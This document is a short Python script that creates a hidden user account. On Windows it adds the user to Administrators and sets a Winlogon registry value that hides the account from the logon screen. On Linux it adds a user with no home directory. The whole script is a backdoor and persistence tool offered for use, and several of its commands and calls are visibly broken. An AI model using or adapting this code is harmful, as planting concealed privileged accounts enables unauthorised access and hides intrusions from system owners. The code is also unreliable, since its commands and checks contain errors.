import os, subprocess, winreg, argparse
from winreg import *


p = argparse.ArgumentParser(description="Create a hidden user !")
p.add_argument("--uname", help="Username to create", metavar="", required=True, nargs=1)
p.add_argument("--passwd", help="Password for the user", metavar="", required=True, nargs=1)
args = p.parse_args()
try:
    username = args.uname[0]
    passwd = args.passwd[0]
except Exception as e:
    print("Something went wrong, please try again.")


# Windows function
def win():
    # Creates the user and group it to Administrators
    os.system(f"net user ${username} {passwd} /add")
    os.system(f"net groups Administrators {username} /add")

    # Create DWORD on registry to hide user on logon screen
    key = r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
    try:
        x = winreg.CreateKey(HKEY_LOCAL_MACHINE,key)
        winreg.SetValueEx(key, '$'+username, 0, winreg.REG_DWORD, '0x00000001')
        x.Close()
    except winreg.error:
        print("Something went wrong.\nPlease try again.")
        quit()


def lin():
    # Creates the user hidden as possible with no login and no home directory
    try:
        p = subprocess.run(['echo', passwd, '|', 'openssl', 'passwd', '-1', '-stdin'],stdout=subprocess.PIPE).stdout.decode()
        os.system(f"adduser --no-create-home --disabled-login --force-badname --quiet -s /bin/bash -p {p} {username}")
    except subprocess.SubprocessError or os.error:
        if subprocess.SubprocessError:
            print("Sorry, something went wrong with 'subprocess'")
        elif os.error:
            print("Sorry, something went wrong with 'os'")


# Determine which Operation System and use correct function
if __name__ == "__main__":
    try:
        if os.name == 'NT':
            win()
        elif os.name == 'posix':
            lin()
    except os.error:
        print('Sorry, something went wrong determining Operation System.')
